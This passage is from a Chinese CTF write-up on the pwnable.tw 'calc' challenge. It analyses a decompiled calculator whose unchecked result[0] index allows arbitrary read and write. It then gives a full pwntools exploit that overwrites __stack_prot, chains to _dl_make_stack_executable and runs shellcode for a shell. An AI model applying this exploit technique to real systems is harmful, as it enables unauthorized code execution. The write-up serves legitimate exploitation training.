__readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是这个calc的函数，可以看到一开始读了canary到栈里，然后从命令行读一行字符串然后调用<code>parse_expr</code>来计算，结果放在<code>result[size - 1]</code>处。<br><code>get_expr</code>的逻辑就是一个字符一个字符读到s里并过滤掉除<code>[0-9]*+-\%</code>的字符。<br><code>init_pool</code>这个函数初始化了一段大小为100*4内存空间。暂时不知道干什么用的，不过通过<code>calc</code>的那个<code>printf</code>可以推断出这里边放有计算的结果。<br><code>parse_expr</code>首先是个for循环对输入的表达式进行遍历。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">v9 = atoi(tmp_num);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (*result)++;            <span class="comment">// 保存数字，result个数+1</span></span><br><span class="line">      result[v4 + <span class="number">1</span>] = v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( expr[i] &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(expr[i + <span class="number">1</span>] - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    num_start = &amp;expr[i + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( s[v7] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( expr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">          <span class="keyword">if</span> ( s[v7] != <span class="string">'+'</span> &amp;&amp; s[v7] != <span class="string">'-'</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            eval(result, s[v7]);</span><br><span class="line">            s[v7] = expr[i];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            s[++v7] = expr[i];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">          eval(result, s[v7]);</span><br><span class="line">          s[v7] = expr[i];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          eval(result, s[v7--]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[v7] = expr[i];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>result为数字栈，s为符号栈，result[0]保存当前数字栈里的数字的个数。通过一个switch来判断符号类型，确定运算顺序，最后一个while从右向左计算表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">  eval(result, s[v7--]);</span><br></pre></td></tr></table></figure><p>通过eval函数计算表达式，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//eval(result, s[v7]);</span></span><br><span class="line"><span class="keyword">int</span> *__<span class="function">cdecl <span class="title">eval</span><span class="params">(<span class="keyword">int</span> *result, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *a3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result[*result - <span class="number">1</span>] += result[*result];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="string">'-'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result[*result - <span class="number">1</span>] -= result[*result];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'/'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result[*result - <span class="number">1</span>] /= result[*result];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result[*result - <span class="number">1</span>] *= result[*result];</span><br><span class="line">  &#125;</span><br><span class="line">  a3 = result;</span><br><span class="line">  --*result;</span><br><span class="line">  <span class="keyword">return</span> a3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到在<code>eval</code>函数中，因为没有检查<code>result[0]</code>的值，如果我们能够控制<code>result[0]</code>的值，我们就可以造成任意地址的写入，绕过<code>canary</code>修改返回地址形成栈溢出。而且在函数<code>calc</code>中，如果我们能控制<code>result[0]</code>就可以通过<code>printf(&quot;%d\n&quot;, result[result[0] - 1 + 1]);</code>读取任意地址。<br>那么我们如何在能控制<code>result[0]</code>的值呢，考虑我们在nc时的输入，发现在输入由符号开始的表达式时，如<code>+20</code>因为第一个字符为符号<code>+</code>而只有一个数字，那么在这样的情况下执行<code>eval时</code>，<code>result[*result - 1] += result[*result];</code>就会变成<code>result[1-1]+=result[1];</code>成功控制了<code>result[0]</code>的值。</p><h2 id="0x2-攻击流程"><a href="#0x2-攻击流程" class="headerlink" title="0x2 攻击流程"></a>0x2 攻击流程</h2><p>我们首先利用数组越界造成的任意地址读写，将<code>__stack_prot</code>改成<code>0x7</code><br>，接着构造ROP链，使其执行<code>_dl_make_stack_executable&lt;__libc_stack_end&gt;</code>(注意这里的<code>__libc_stack_end</code>在eax内)，就能关闭<code>NX</code>保护，然后我们就利用<code>jmp esp</code>或者<code>call esp</code>劫持eip到栈上从而getshell。</p><h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"./calc"</span></span><br><span class="line">context.binary = filename</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.A:</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">stack_addr = <span class="literal">None</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span> <span class="comment">#pop eax; ret</span></span><br><span class="line">jmp_esp = <span class="number">0x080e3f63</span> <span class="comment">#jmp esp</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(cmd=None)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">w</span><span class="params">(offset,value)</span>:</span></span><br><span class="line">    offset = str(offset)</span><br><span class="line">    p.sendline(<span class="string">"+"</span>+offset)</span><br><span class="line">    orgin = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> value - orgin &gt;= <span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="comment">#import pdb;pdb.set_trace()</span></span><br><span class="line">        value = unpack( pack(value),<span class="string">'all'</span>,sign=<span class="literal">True</span>)</span><br><span class="line">        value = -(orgin - value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value -= orgin</span><br><span class="line">    p.sendline(<span class="string">"+"</span> + offset + (<span class="string">'+'</span> <span class="keyword">if</span> value &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">'-'</span>) + str(abs(value)))</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stack_addr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> stack_addr</span><br><span class="line">    p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">    orgin = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    stack_addr = u32(pack(orgin<span class="number">-1472</span>))</span><br><span class="line">    log.info(<span class="string">"get offset_base: %#x"</span> % stack_addr)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"===\n"</span>)</span><br><span class="line"></span><br><span class="line">    get_stack_addr()</span><br><span class="line">    </span><br><span class="line">    z = (<span class="number">0x1080ebfec</span> - (stack_addr))/<span class="number">4</span></span><br><span class="line">    log.info(<span class="string">"__stack_prot offset: %#x"</span> % z)</span><br><span class="line">    p.sendline(<span class="string">'+%d-%d'</span> % (z,<span class="number">0xfffff9</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    w(<span class="number">361</span>,pop_eax)</span><br><span class="line">    w(<span class="number">362</span>,elf.sym[<span class="string">'__libc_stack_end'</span>])</span><br><span class="line">    w(<span class="number">363</span>,elf.sym[<span class="string">'_dl_make_stack_executable'</span>])</span><br><span class="line">       </span><br><span class="line">    w(<span class="number">364</span>,jmp_esp)</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    shellcode = [u32(shellcode[x:x+<span class="number">4</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(shellcode),<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,len(shellcode)):</span><br><span class="line">        w(<span class="number">365</span>+_, shellcode[_])</span><br><span class="line">        </span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>注意因为<code>atoi</code>会将超过<code>0x7ffffffff</code>的数转换为<code>0x7fffffff</code>，所以写exp的时候要注意。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Integer overflow </tag>
            
            <tag> Array out of bounds </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
